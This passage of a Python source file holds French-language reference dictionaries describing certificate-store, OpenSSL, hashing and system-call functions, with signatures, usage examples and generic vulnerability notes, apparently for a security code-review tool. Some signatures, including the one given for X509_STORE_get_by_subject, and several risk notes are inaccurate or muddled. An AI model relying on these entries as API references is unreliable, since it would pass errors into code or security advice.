    'CertDeleteCertificateFromStore': 'BOOL CertDeleteCertificateFromStore(PCCERT_CONTEXT pCertContext) [----] ex: CertDeleteCertificateFromStore(certContext) -> supprime un certificat d\'un magasin (Windows) [----] Vulns/Infos 1 : Suppression incorrecte ou incomplet peut laisser des certificats inutiles ou sensibles exposés [----] Vulns/Infos 2 : Suppression non autorisée de certificats peut être utilisée dans des attaques pour supprimer des certificats légitimes',

    'X509_STORE_new': 'X509_STORE* X509_STORE_new(void) [----] ex: store = X509_STORE_new() -> crée un nouveau magasin de certificats (OpenSSL) [----] Vulns/Infos 1 : Ne pas protéger un magasin de certificats peut permettre à des attaquants d\'accéder à des clés privées sensibles [----] Vulns/Infos 2 : Une mauvaise gestion de la mémoire lors de la création du magasin peut entraîner des fuites de mémoire',

    'X509_STORE_free': 'void X509_STORE_free(X509_STORE *store) [----] ex: X509_STORE_free(store) -> libère un magasin de certificats (OpenSSL) [----] Vulns/Infos 1 : Oublier de libérer un magasin après utilisation peut entraîner des fuites de mémoire ou une fuite d\'informations sensibles [----] Vulns/Infos 2 : Libération incorrecte peut rendre le magasin inaccessible ou corrompu',

    'X509_STORE_add_cert': 'int X509_STORE_add_cert(X509_STORE *store, X509 *cert) [----] ex: X509_STORE_add_cert(store, cert) -> ajoute un certificat à un magasin (OpenSSL) [----] Vulns/Infos 1 : Ajouter un certificat non validé peut introduire un certificat malveillant dans le magasin [----] Vulns/Infos 2 : Mauvais paramétrage de l\'ajout de certificat peut entraîner l\'insertion de certificats invalides ou périmés',

    'X509_STORE_get_by_subject': 'X509* X509_STORE_get_by_subject(X509_STORE *store, int type, X509_NAME *name) [----] ex: cert = X509_STORE_get_by_subject(store, V_OK, subjectName) -> recherche un certificat par sujet dans un magasin (OpenSSL) [----] Vulns/Infos 1 : Une recherche trop large peut récupérer des certificats non sécurisés ou obsolètes [----] Vulns/Infos 2 : Risque de fuite de données si des informations sensibles sont exposées par une recherche non sécurisée'
}

all_hash_generation_functions = { #fait
    'nom_du_dictionnaire': 'Toutes les fonctions de génération de hash',
    'MD5': '[Déprécié] Génère un hachage MD5 (ne pas utiliser pour la sécurité)',
    'SHA1': '[Déprécié] Génère un hachage SHA-1 (ne pas utiliser pour la sécurité)',
    'SHA256': 'Génère un hachage SHA-256 (sécurisé)',
    'SHA512': 'Génère un hachage SHA-512 (sécurisé)',
    'SHA3_256': 'Génère un hachage SHA3-256 (sécurisé, nouvelle génération)',
    'BLAKE2': 'Génère un hachage BLAKE2 (alternative moderne à SHA)',
    'HMAC': 'Génère un HMAC (Hash-based Message Authentication Code)',
    'HMAC-SHA256': 'HMAC avec SHA-256 (sécurisé)',
    'bcrypt': 'Génère un hachage adapté aux mots de passe (lent et sécurisé)',
    'scrypt': 'Hachage avec coût mémoire élevé (sécurisé contre le matériel spécialisé)',
    'Argon2': 'Gagnant du Password Hashing Competition (recommandé en 2023)',
    'PBKDF2': 'Dérivation de clé à partir de mots de passe (avec itérations)',
    'HKDF': 'Dérivation de clé HMAC (pour étendre des secrets)',
    'CryptCreateHash': '[Déprécié] Crée un contexte de hachage (CryptoAPI Windows)',
    'CryptHashData': '[Déprécié] Ajoute des données à hacher (CryptoAPI Windows)',
    'CryptDestroyHash': '[Déprécié] Nettoie le contexte de hachage (CryptoAPI Windows)',
    'BCryptCreateHash': 'Crée un contexte de hachage (CNG Windows moderne)',
    'BCryptHashData': 'Met à jour le hachage avec des données (CNG Windows)',
    'BCryptFinishHash': 'Termine le calcul du hachage (CNG Windows)',
    'EVP_DigestInit': 'Initialise un contexte de hachage (OpenSSL)',
    'EVP_DigestUpdate': 'Met à jour le hachage avec des données (OpenSSL)',
    'EVP_DigestFinal': 'Récupère le hachage final (OpenSSL)',
    'EVP_sha256': 'Sélectionne l\'algorithme SHA-256 (OpenSSL)',
    'EVP_MD_CTX_new': 'Alloue un contexte de hachage (OpenSSL ≥ 1.1.1)',
    'EVP_MD_CTX_free': 'Libère un contexte de hachage (OpenSSL ≥ 1.1.1)',
    'libsodium.crypto_generichash': 'Hachage générique (libsodium, BLAKE2)',
    'gcry_md_hash_buffer': 'Hachage via libgcrypt (GNU Privacy Guard)',
    'CC_SHA256_Init': 'Hachage SHA-256 (CommonCrypto, macOS)',
    'getrandom': 'Récupère des octets aléatoires sécurisés (Linux 3.17+)',
    'hashlib.sha256()': 'Génère un hachage SHA-256 (Python)',
    'java.security.MessageDigest': 'Classe de hachage cryptographique (Java)',
    'System.Security.Cryptography.SHA256': 'Hachage SHA-256 (.NET)'
}

all_hash_generation_functions_infos = {
    'nom_du_dictionnaire': 'Toutes les fonctions de génération de hash',
    'MD5': 'unsigned char* MD5(const unsigned char *d, size_t n, unsigned char *md) [----] ex: MD5(data, length, hash) -> génère un hachage MD5 [----] Vulns/Infos 1 : MD5 est considéré comme cassé et vulnérable aux collisions [----] Vulns/Infos 2 : Risque de sécurité si MD5 est utilisé pour la vérification d\'intégrité ou des signatures numériques',

    'SHA1': 'unsigned char* SHA1(const unsigned char *d, size_t n, unsigned char *md) [----] ex: SHA1(data, length, hash) -> génère un hachage SHA-1 [----] Vulns/Infos 1 : SHA-1 est également vulnérable aux attaques de collision et est déconseillé pour les applications de sécurité [----] Vulns/Infos 2 : Une attaque par collision peut permettre de forger des certificats ou des messages',

    'SHA256': 'unsigned char* SHA256(const unsigned char *d, size_t n, unsigned char *md) [----] ex: SHA256(data, length, hash) -> génère un hachage SHA-256 [----] Vulns/Infos 1 : Bien que plus sécurisé que MD5 ou SHA-1, le SHA-256 peut être vulnérable à des attaques par force brute si une clé faible est utilisée [----] Vulns/Infos 2 : Mauvaise gestion des salages dans les implémentations peut réduire la sécurité',

    'SHA512': 'unsigned char* SHA512(const unsigned char *d, size_t n, unsigned char *md) [----] ex: SHA512(data, length, hash) -> génère un hachage SHA-512 [----] Vulns/Infos 1 : SHA-512 est plus sécurisé que SHA-256 mais reste vulnérable à des attaques par force brute si utilisé de manière incorrecte avec de mauvaises pratiques de gestion des clés',

    'HMAC': 'unsigned char* HMAC(const EVP_MD *evp_md, const void *key, int key_len, const unsigned char *d, size_t n, unsigned char *md) [----] ex: HMAC(EVP_sha256(), key, key_len, data, data_length, hash) -> génère un code d\'authentification de message basé sur un hachage (HMAC) [----] Vulns/Infos 1 : Une gestion incorrecte de la clé secrète peut compromettre la sécurité de HMAC [----] Vulns/Infos 2 : L\'utilisation d\'algorithmes de hachage faibles peut affaiblir l\'authentification HMAC',

    'bcrypt': 'char* bcrypt_hashpw(const char *password, const char *salt) [----] ex: bcrypt_hashpw(password, salt) -> génère un hachage bcrypt [----] Vulns/Infos 1 : Si le nombre de tours est trop faible, bcrypt peut être vulnérable aux attaques par force brute [----] Vulns/Infos 2 : Une mauvaise gestion du sel peut réduire l\'efficacité de bcrypt pour se protéger contre les attaques par dictionnaire',

    'scrypt': 'char* scrypt(const unsigned char *passwd, size_t passwdlen, const unsigned char *salt, size_t saltlen, unsigned long long N, unsigned long long r, unsigned long long p, size_t dklen, unsigned char *out) [----] ex: scrypt(password, password_length, salt, salt_length, N, r, p, hash_length, hash) -> génère un hachage scrypt [----] Vulns/Infos 1 : La faiblesse des paramètres N, r, p peut rendre scrypt vulnérable aux attaques par force brute [----] Vulns/Infos 2 : Une mauvaise gestion du sel ou de la clé peut entraîner un hachage faible',

    'PBKDF2': 'unsigned char* PKCS5_PBKDF2_HMAC(const char *password, int password_len, const unsigned char *salt, int salt_len, int iterations, const EVP_MD *digest, int dklen, unsigned char *out) [----] ex: PKCS5_PBKDF2_HMAC(password, password_length, salt, salt_length, iterations, EVP_sha256(), dklen, hash) -> génère un hachage PBKDF2 [----] Vulns/Infos 1 : L\'utilisation de faibles valeurs pour les itérations et la longueur de la clé peut rendre PBKDF2 vulnérable à des attaques par force brute [----] Vulns/Infos 2 : L\'utilisation de mauvaises fonctions de hachage de base peut compromettre la sécurité',

    'CryptHashData': 'BOOL CryptHashData(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags) [----] ex: CryptHashData(hashContext, data, dataLength, 0) -> hache des données (Windows) [----] Vulns/Infos 1 : La mauvaise gestion du contexte de hachage peut entraîner des erreurs de sécurité ou des fuites d\'information [----] Vulns/Infos 2 : Utilisation de mauvais algorithmes de hachage dans CryptHashData peut exposer à des collisions ou à des attaques par force brute',

    'CryptCreateHash': 'BOOL CryptCreateHash(HCRYPTPROV hCryptProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash) [----] ex: CryptCreateHash(cryptProvider, CALG_SHA_256, 0, 0, &hashContext) -> crée un objet de hachage (Windows) [----] Vulns/Infos 1 : Une mauvaise gestion des clés de hachage peut exposer à des attaques de type "key recovery" [----] Vulns/Infos 2 : Une mauvaise gestion des ressources dans la création du hachage peut entraîner des fuites de mémoire',

    'CryptDestroyHash': 'BOOL CryptDestroyHash(HCRYPTHASH hHash) [----] ex: CryptDestroyHash(hashContext) -> détruit un objet de hachage (Windows) [----] Vulns/Infos 1 : Ne pas détruire le contexte de hachage correctement peut laisser des informations sensibles en mémoire [----] Vulns/Infos 2 : L\'absence de destruction peut conduire à des fuites de mémoire',

    'EVP_DigestInit': 'int EVP_DigestInit(EVP_MD_CTX *ctx, const EVP_MD *type) [----] ex: EVP_DigestInit(&ctx, EVP_sha256()) -> initialise un contexte de hachage (OpenSSL) [----] Vulns/Infos 1 : Une mauvaise initialisation peut entraîner un contexte de hachage invalide et des résultats incorrects [----] Vulns/Infos 2 : L\'utilisation d\'un mauvais algorithme de hachage peut compromettre la sécurité',

    'EVP_DigestUpdate': 'int EVP_DigestUpdate(EVP_MD_CTX *ctx, const void *d, size_t cnt) [----] ex: EVP_DigestUpdate(&ctx, data, dataLength) -> met à jour un contexte de hachage avec des données (OpenSSL) [----] Vulns/Infos 1 : Si les données sont mal formatées, cela peut entraîner un hachage incorrect ou vulnérable [----] Vulns/Infos 2 : Une gestion incorrecte du contexte peut conduire à des erreurs et des failles de sécurité',

    'EVP_DigestFinal': 'int EVP_DigestFinal(EVP_MD_CTX *ctx, unsigned char *md, unsigned int *s) [----] ex: EVP_DigestFinal(&ctx, hash, &len) -> finalise un contexte de hachage et récupère le hachage (OpenSSL) [----] Vulns/Infos 1 : Une mauvaise gestion de la finalisation peut entraîner un hachage incomplet ou incorrect [----] Vulns/Infos 2 : Si le contexte de hachage est corrompu, cela peut rendre les résultats vulnérables à des attaques'
}


all_openssl_functions = { # FAIT
    'nom_du_dictionnaire': 'Toutes les fonctions OpenSSL',
    'SSL_new': 'Crée un nouvel objet SSL',
    'SSL_free': 'Libère un objet SSL',
    'SSL_connect': 'Démarre une connexion SSL côté client',
    'SSL_accept': 'Démarre une connexion SSL côté serveur',
    'SSL_read': 'Lit des données à partir d\'une connexion SSL',
    'SSL_write': 'Écrit des données dans une connexion SSL',
    'SSL_shutdown': 'Ferme une connexion SSL',
    'SSL_CTX_new': 'Crée un nouveau contexte SSL',
    'SSL_CTX_free': 'Libère un contexte SSL',
    'SSL_CTX_set_options': 'Configure les options d\'un contexte SSL',
    'SSL_CTX_load_verify_locations': 'Charge les emplacements des certificats de vérification',
    'SSL_CTX_use_certificate_file': 'Charge un certificat à partir d\'un fichier',
    'SSL_CTX_use_PrivateKey_file': 'Charge une clé privée à partir d\'un fichier',
    'SSL_CTX_check_private_key': 'Vérifie la correspondance entre la clé privée et le certificat',
    'SSL_get_peer_certificate': 'Récupère le certificat du pair',
    'SSL_get_verify_result': 'Récupère le résultat de la vérification du certificat',
    'X509_new': 'Crée un nouvel objet X509',
    'X509_free': 'Libère un objet X509',
    'X509_NAME_new': 'Crée un nouvel objet X509_NAME',
    'X509_NAME_free': 'Libère un objet X509_NAME',
    'X509_NAME_add_entry_by_txt': 'Ajoute une entrée à un objet X509_NAME',
    'X509_get_subject_name': 'Récupère le nom du sujet d\'un certificat X509',
    'X509_get_issuer_name': 'Récupère le nom de l\'émetteur d\'un certificat X509',
    'X509_sign': 'Signe un certificat X509 avec une clé privée',
    'X509_verify': 'Vérifie un certificat X509 avec une clé publique',
    'PEM_read_bio_X509': 'Lit un certificat X509 à partir d\'un BIO PEM',
    'PEM_write_bio_X509': 'Écrit un certificat X509 dans un BIO PEM',
    'PEM_read_bio_PrivateKey': 'Lit une clé privée à partir d\'un BIO PEM',
    'PEM_write_bio_PrivateKey': 'Écrit une clé privée dans un BIO PEM',
    'PEM_read_bio_PUBKEY': 'Lit une clé publique à partir d\'un BIO PEM',
    'PEM_write_bio_PUBKEY': 'Écrit une clé publique dans un BIO PEM'
}

all_openssl_functions_infos = {
    'nom_du_dictionnaire': 'Toutes les fonctions OpenSSL',
    'SSL_new': 'SSL* SSL_new(SSL_CTX *ctx) [----] ex: SSL_new(context) -> crée un nouvel objet SSL [----] Vulns/Infos 1 : Un mauvais contexte SSL peut entraîner des connexions non sécurisées [----] Vulns/Infos 2 : Les configurations par défaut peuvent ne pas être assez sécurisées',

    'SSL_free': 'void SSL_free(SSL *ssl) [----] ex: SSL_free(sslContext) -> libère un objet SSL [----] Vulns/Infos 1 : Ne pas libérer les objets SSL correctement peut provoquer des fuites de mémoire ou des fuites d\'informations sensibles',

    'SSL_connect': 'int SSL_connect(SSL *ssl) [----] ex: SSL_connect(sslContext) -> démarre une connexion SSL côté client [----] Vulns/Infos 1 : Si les certificats ne sont pas validés correctement, cela peut conduire à des attaques de type Man-in-the-Middle (MITM) [----] Vulns/Infos 2 : Un protocole de négociation SSL faible peut exposer la connexion à des attaques',

    'SSL_accept': 'int SSL_accept(SSL *ssl) [----] ex: SSL_accept(sslContext) -> démarre une connexion SSL côté serveur [----] Vulns/Infos 1 : Une mauvaise configuration SSL peut permettre l\'exécution de protocoles obsolètes ou vulnérables [----] Vulns/Infos 2 : Si le serveur ne vérifie pas correctement les certificats du client, cela peut permettre des attaques par usurpation',

    'SSL_read': 'int SSL_read(SSL *ssl, void *buf, int num) [----] ex: SSL_read(sslContext, buffer, length) -> lit des données à partir d\'une connexion SSL [----] Vulns/Infos 1 : Si les données ne sont pas vérifiées avant leur utilisation, cela peut permettre des attaques de type buffer overflow [----] Vulns/Infos 2 : Une mauvaise gestion des erreurs peut conduire à la fuite d\'informations sensibles',

    'SSL_write': 'int SSL_write(SSL *ssl, const void *buf, int num) [----] ex: SSL_write(sslContext, buffer, length) -> écrit des données dans une connexion SSL [----] Vulns/Infos 1 : L\'envoi de données non chiffrées ou incorrectement chiffrées peut exposer la communication à des attaques de type eavesdropping [----] Vulns/Infos 2 : Une mauvaise gestion des buffers peut entraîner des attaques par injection',

    'SSL_shutdown': 'int SSL_shutdown(SSL *ssl) [----] ex: SSL_shutdown(sslContext) -> ferme une connexion SSL [----] Vulns/Infos 1 : Ne pas terminer correctement la connexion SSL peut laisser des données sensibles accessibles [----] Vulns/Infos 2 : Des Vulns/Infoss dans le processus de fermeture peuvent permettre une reprise de la connexion',

    'SSL_CTX_new': 'SSL_CTX* SSL_CTX_new(const SSL_METHOD *method) [----] ex: SSL_CTX_new(method) -> crée un nouveau contexte SSL [----] Vulns/Infos 1 : Utiliser des méthodes SSL obsolètes ou vulnérables lors de la création du contexte peut compromettre la sécurité globale de la connexion [----] Vulns/Infos 2 : Une mauvaise gestion des paramètres du contexte SSL peut exposer à des attaques',

    'SSL_CTX_free': 'void SSL_CTX_free(SSL_CTX *ctx) [----] ex: SSL_CTX_free(context) -> libère un contexte SSL [----] Vulns/Infos 1 : Ne pas libérer correctement le contexte SSL peut entraîner des fuites de mémoire et d\'informations sensibles',

    'SSL_CTX_set_options': 'long SSL_CTX_set_options(SSL_CTX *ctx, long options) [----] ex: SSL_CTX_set_options(context, SSL_OP_NO_SSLv2) -> configure les options d\'un contexte SSL [----] Vulns/Infos 1 : Des options incorrectes peuvent affaiblir la sécurité de la connexion SSL [----] Vulns/Infos 2 : Les options trop permissives peuvent exposer des canaux de communication vulnérables',

    'SSL_CTX_load_verify_locations': 'int SSL_CTX_load_verify_locations(SSL_CTX *ctx, const char *CAfile, const char *CApath) [----] ex: SSL_CTX_load_verify_locations(context, "path_to_cert.pem", NULL) -> charge les emplacements des certificats de vérification [----] Vulns/Infos 1 : L\'utilisation de certificats invalides ou compromis peut rendre la vérification SSL inefficace [----] Vulns/Infos 2 : Une mauvaise gestion des emplacements de certificats peut entraîner des échecs de vérification',

    'SSL_CTX_use_certificate_file': 'int SSL_CTX_use_certificate_file(SSL_CTX *ctx, const char *file, int type) [----] ex: SSL_CTX_use_certificate_file(context, "cert.pem", SSL_FILETYPE_PEM) -> charge un certificat à partir d\'un fichier [----] Vulns/Infos 1 : Le certificat peut être compromis si le fichier n\'est pas bien protégé [----] Vulns/Infos 2 : Un mauvais type de fichier peut entraîner des erreurs de chargement ou une mauvaise vérification',

    'SSL_CTX_use_PrivateKey_file': 'int SSL_CTX_use_PrivateKey_file(SSL_CTX *ctx, const char *file, int type) [----] ex: SSL_CTX_use_PrivateKey_file(context, "private_key.pem", SSL_FILETYPE_PEM) -> charge une clé privée à partir d\'un fichier [----] Vulns/Infos 1 : Une mauvaise protection du fichier de la clé privée peut entraîner une fuite de la clé privée',

    'SSL_CTX_check_private_key': 'int SSL_CTX_check_private_key(const SSL_CTX *ctx) [----] ex: SSL_CTX_check_private_key(context) -> vérifie la correspondance entre la clé privée et le certificat [----] Vulns/Infos 1 : La vérification incorrecte peut conduire à des erreurs d\'authentification [----] Vulns/Infos 2 : Une mauvaise gestion des clés privées peut rendre la connexion vulnérable aux attaques',

    'SSL_get_peer_certificate': 'X509* SSL_get_peer_certificate(const SSL *ssl) [----] ex: SSL_get_peer_certificate(sslContext) -> récupère le certificat du pair [----] Vulns/Infos 1 : La non-vérification du certificat du pair peut permettre des attaques Man-in-the-Middle [----] Vulns/Infos 2 : La réception d\'un certificat compromis peut entraîner des problèmes de sécurité',

    'SSL_get_verify_result': 'long SSL_get_verify_result(const SSL *ssl) [----] ex: SSL_get_verify_result(sslContext) -> récupère le résultat de la vérification du certificat [----] Vulns/Infos 1 : La non-vérification des résultats peut permettre une attaque sur les connexions SSL',

    'X509_new': 'X509* X509_new(void) [----] ex: X509_new() -> crée un nouvel objet X509 [----] Vulns/Infos 1 : La mauvaise gestion des objets X509 peut entraîner des erreurs de validation ou des fuites d\'informations sensibles',

    'X509_free': 'void X509_free(X509 *x) [----] ex: X509_free(cert) -> libère un objet X509 [----] Vulns/Infos 1 : Ne pas libérer correctement l\'objet X509 peut entraîner une fuite de mémoire',

    'X509_NAME_new': 'X509_NAME* X509_NAME_new(void) [----] ex: X509_NAME_new() -> crée un nouvel objet X509_NAME [----] Vulns/Infos 1 : Une mauvaise gestion des objets X509_NAME peut rendre la vérification des certificats incorrecte',

    'X509_NAME_free': 'void X509_NAME_free(X509_NAME *name) [----] ex: X509_NAME_free(subjectName) -> libère un objet X509_NAME [----] Vulns/Infos 1 : Une mauvaise gestion de la mémoire peut entraîner des fuites d\'informations sensibles',

    'X509_NAME_add_entry_by_txt': 'int X509_NAME_add_entry_by_txt(X509_NAME *name, const char *field, int type, const unsigned char *bytes, int len, int loc, int set) [----] ex: X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, certBytes, certLength, -1, 0) -> ajoute une entrée à un objet X509_NAME [----] Vulns/Infos 1 : Manipuler incorrectement les informations de certificat peut entraîner des erreurs de validation',

    'X509_get_subject_name': 'X509_NAME* X509_get_subject_name(X509 *x) [----] ex: X509_get_subject_name(cert) -> récupère le nom du sujet d\'un certificat X509 [----] Vulns/Infos 1 : Mauvaise gestion des informations du sujet peut entraîner des erreurs d\'authentification',

    'X509_get_issuer_name': 'X509_NAME* X509_get_issuer_name(X509 *x) [----] ex: X509_get_issuer_name(cert) -> récupère le nom de l\'émetteur d\'un certificat X509 [----] Vulns/Infos 1 : Manipulation incorrecte des informations de l\'émetteur peut entraîner des erreurs de validation',

    'X509_sign': 'int X509_sign(X509 *x, EVP_PKEY *pkey, const EVP_MD *md) [----] ex: X509_sign(cert, privateKey, EVP_sha256()) -> signe un certificat X509 avec une clé privée [----] Vulns/Infos 1 : Le vol ou la fuite de la clé privée compromet la signature du certificat',

    'X509_verify': 'int X509_verify(X509 *x, EVP_PKEY *pkey) [----] ex: X509_verify(cert, publicKey) -> vérifie un certificat X509 avec une clé publique [----] Vulns/Infos 1 : Une vérification incorrecte peut rendre la signature invalide ou compromise',

    'PEM_read_bio_X509': 'X509* PEM_read_bio_X509(BIO *bio, X509 **x, pem_password_cb *cb, void *u) [----] ex: PEM_read_bio_X509(bio, &cert, NULL, NULL) -> lit un certificat X509 à partir d\'un BIO PEM [----] Vulns/Infos 1 : Des fichiers PEM mal protégés peuvent exposer le certificat à des attaques',

    'PEM_write_bio_X509': 'int PEM_write_bio_X509(BIO *bio, X509 *x) [----] ex: PEM_write_bio_X509(bio, cert) -> écrit un certificat X509 dans un BIO PEM [----] Vulns/Infos 1 : L\'écriture de certificats dans un fichier non sécurisé peut entraîner des fuites d\'informations',

    'PEM_read_bio_PrivateKey': 'EVP_PKEY* PEM_read_bio_PrivateKey(BIO *bio, EVP_PKEY **x, pem_password_cb *cb, void *u) [----] ex: PEM_read_bio_PrivateKey(bio, &privateKey, NULL, NULL) -> lit une clé privée à partir d\'un BIO PEM [----] Vulns/Infos 1 : Un accès non autorisé aux fichiers de clés privées peut compromettre la sécurité',

    'PEM_write_bio_PrivateKey': 'int PEM_write_bio_PrivateKey(BIO *bio, EVP_PKEY *x, const EVP_CIPHER *enc, unsigned char *kstr, int klen, pem_password_cb *cb, void *u) [----] ex: PEM_write_bio_PrivateKey(bio, privateKey, NULL, NULL, 0, NULL, NULL) -> écrit une clé privée dans un BIO PEM [----] Vulns/Infos 1 : La protection insuffisante des clés privées peut entraîner des compromissions',

    'PEM_read_bio_PUBKEY': 'EVP_PKEY* PEM_read_bio_PUBKEY(BIO *bio, EVP_PKEY **x, pem_password_cb *cb, void *u) [----] ex: PEM_read_bio_PUBKEY(bio, &publicKey, NULL, NULL) -> lit une clé publique à partir d\'un BIO PEM [----] Vulns/Infos 1 : Un fichier non sécurisé peut exposer la clé publique à des attaques',

    'PEM_write_bio_PUBKEY': 'int PEM_write_bio_PUBKEY(BIO *bio, EVP_PKEY *x) [----] ex: PEM_write_bio_PUBKEY(bio, publicKey) -> écrit une clé publique dans un BIO PEM [----] Vulns/Infos 1 : Un fichier public non sécurisé peut rendre la clé publique vulnérable à des attaques d\'usurpation'
}

all_other_syscal = { #FAIT
    'nom_du_dictionnaire': 'Tous les autres syscalls',
    'clone': 'Crée un nouveau processus ou thread (Linux)',
    'vfork': 'Crée un processus enfant en partageant l\'espace mémoire (Linux, obsolète)',
    'execveat': 'Exécute un programme avec un répertoire de travail spécifique (Linux)',
    'waitid': 'Attend un changement d\'état d\'un processus enfant (Linux)',
    'gettid': 'Récupère l\'ID du thread courant (Linux)',
    'set_tid_address': 'Définit l\'adresse de stockage de l\'ID de thread (Linux)',
    'sched_setaffinity': 'Définit les CPU autorisés pour un thread (Linux)',
    'capset': 'Modifie les capacités (capabilities) d\'un processus (Linux)',
    'mremap': 'Redimensionne ou déplace une région mémoire mappée (Linux)',
    'remap_file_pages': 'Remappe les pages d\'un fichier en mémoire (Linux, obsolète)',
    'mbind': 'Contrôle la politique NUMA pour une région mémoire (Linux)',
    'membarrier': 'Synchronise les barrières mémoire entre threads (Linux)',
    'renameat2': 'Renomme un fichier avec des options supplémentaires (Linux)',
    'copy_file_range': 'Copie des données entre deux descripteurs de fichiers (Linux)',
    'fanotify_init': 'Initialise une notification de fichiers avancée (Linux)',
    'fanotify_mark': 'Configure les événements surveillés par fanotify (Linux)',
    'fallocate': 'Alloue de l\'espace disque pour un fichier (Linux)',
    'sync_file_range': 'Synchronise une plage spécifique d\'un fichier (Linux)',
    'accept4': 'Accepte une connexion avec des options (ex: NON_BLOCK) (Linux)',
    'epoll_ctl_old': 'Ancienne version de contrôle epoll (Linux, obsolète)',
    'io_uring_setup': 'Initialise un contexte de E/S asynchrones (io_uring, Linux)',
    'io_uring_enter': 'Soumet ou récupère des E/S asynchrones (io_uring, Linux)',
    'seccomp': 'Configure le filtrage d\'appels système (sandboxing, Linux)',
    'landlock_create_ruleset': 'Crée un ensemble de règles Landlock (sandboxing, Linux)',
    'ptrace': 'Contrôle un processus distant (débogage, injection, Linux)',
    'arch_prctl': 'Définit des paramètres spécifiques à l\'architecture (x86_64, Linux)',
    'sysfs': 'Accède aux informations du sysfs (Linux, obsolète)',
    'NtCreateProcessEx': 'Crée un processus avec des options étendues (Windows)',
    'NtCreateThread': 'Crée un thread dans un processus distant (Windows)',
    'NtSuspendProcess': 'Suspend l\'exécution d\'un processus (Windows)',
    'NtResumeProcess': 'Reprend l\'exécution d\'un processus (Windows)',
    'NtQueryInformationProcess': 'Récupère des infos sur un processus (ex: DebugPort, Windows)',
    'NtSetInformationThread': 'Modifie les attributs d\'un thread (ex: masquage, Windows)',
    'NtAllocateVirtualMemory': 'Alloue de la mémoire virtuelle (Windows)',
    'NtProtectVirtualMemory': 'Modifie les permissions d\'une région mémoire (Windows)',
    'NtReadVirtualMemory': 'Lit la mémoire d\'un processus distant (Windows)',
    'NtWriteVirtualMemory': 'Écrit dans la mémoire d\'un processus distant (Windows)',
    'NtFlushVirtualMemory': 'Vide les modifications mémoire vers le disque (Windows)',
    'NtCreateFile': 'Ouvre ou crée un fichier avec des droits étendus (Windows)',
    'NtDeleteFile': 'Supprime un fichier (Windows)',
    'NtQueryDirectoryFile': 'Liste les fichiers d\'un répertoire (Windows)',
    'NtSetInformationFile': 'Modifie les attributs d\'un fichier (Windows)',
    'NtFsControlFile': 'Contrôle des opérations de système de fichiers (Windows)',
    'NtDeviceIoControlFile': 'Envoie des commandes IOCTL à un périphérique (Windows)',
    'NtCreateIoCompletion': 'Crée un port de complétion pour les E/S asynchrones (Windows)',
    'NtSetIoCompletion': 'Définit l\'état d\'une E/S asynchrone (Windows)',
    'NtAdjustPrivilegesToken': 'Modifie les privilèges d\'un jeton de sécurité (Windows)',
    'NtQuerySecurityObject': 'Récupère les descripteurs de sécurité d\'un objet (Windows)',
    'NtImpersonateClientOfPort': 'Emprunte l\'identité d\'un client (RPC, Windows)',
}

all_other_syscal_infos = {
    'nom_du_dictionnaire': 'Tous les autres syscalls',
    'open': 'int open(const char *pathname, int flags, mode_t mode) [----] ex: open("file.txt", O_RDONLY) -> ouvre un fichier [----] Vulns/Infos 1 : L\'ouverture de fichiers non protégés peut exposer des données sensibles [----] Vulns/Infos 2 : L\'utilisation incorrecte des flags peut entraîner des erreurs de permissions',

    'close': 'int close(int fd) [----] ex: close(fileDescriptor) -> ferme un fichier [----] Vulns/Infos 1 : Oublier de fermer un descripteur de fichier peut entraîner des fuites de ressources ou de données sensibles',

    'read': 'ssize_t read(int fd, void *buf, size_t count) [----] ex: read(fileDescriptor, buffer, 1024) -> lit des données à partir d\'un fichier [----] Vulns/Infos 1 : Lire à partir d\'un fichier non sécurisé peut exposer des informations sensibles [----] Vulns/Infos 2 : Les erreurs de gestion de la mémoire peuvent entraîner un dépassement de tampon',

    'write': 'ssize_t write(int fd, const void *buf, size_t count) [----] ex: write(fileDescriptor, data, length) -> écrit des données dans un fichier [----] Vulns/Infos 1 : L\'écriture non contrôlée peut provoquer une corruption de données ou un dépassement de tampon [----] Vulns/Infos 2 : Des écritures dans des fichiers sensibles peuvent entraîner une fuite de données',

    'fork': 'pid_t fork(void) [----] ex: fork() -> crée un nouveau processus [----] Vulns/Infos 1 : Ne pas gérer correctement les processus fils peut entraîner des fuites de mémoire ou des ressources [----] Vulns/Infos 2 : La création excessive de processus peut entraîner une attaque par déni de service',

    'execve': 'int execve(const char *pathname, char *const argv[], char *const envp[]) [----] ex: execve("/bin/ls", args, env) -> exécute un programme [----] Vulns/Infos 1 : L\'exécution de programmes malveillants ou non vérifiés peut compromettre la sécurité du système [----] Vulns/Infos 2 : Les erreurs dans la gestion des arguments peuvent permettre des attaques par injection',

    'wait': 'pid_t wait(int *status) [----] ex: wait(&status) -> attend la fin d\'un processus [----] Vulns/Infos 1 : La gestion incorrecte des statuts de processus peut entraîner des fuites de ressources ou des erreurs',

    'kill': 'int kill(pid_t pid, int sig) [----] ex: kill(pid, SIGTERM) -> envoie un signal à un processus [----] Vulns/Infos 1 : L\'envoi de signaux non sécurisés peut interrompre des processus critiques ou être utilisé dans des attaques DoS',

    'socket': 'int socket(int domain, int type, int protocol) [----] ex: socket(AF_INET, SOCK_STREAM, 0) -> crée un point de communication [----] Vulns/Infos 1 : La création de sockets mal sécurisés peut exposer des canaux de communication à des attaques',

    'connect': 'int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) [----] ex: connect(sock, &serverAddr, sizeof(serverAddr)) -> établit une connexion [----] Vulns/Infos 1 : Les connexions non sécurisées peuvent exposer les données à des attaques par interception [----] Vulns/Infos 2 : L\'utilisation de ports non sécurisés peut rendre la connexion vulnérable aux attaques externes',

    'bind': 'int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) [----] ex: bind(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) -> lie une adresse à un socket [----] Vulns/Infos 1 : L\'association incorrecte de l\'adresse peut rendre le socket vulnérable à des attaques par usurpation',

    'listen': 'int listen(int sockfd, int backlog) [----] ex: listen(serverSock, 5) -> écoute les connexions entrantes [----] Vulns/Infos 1 : L\'utilisation d\'un backlog trop élevé peut saturer le serveur [----] Vulns/Infos 2 : Les connexions non filtrées peuvent exposer le serveur à des attaques',

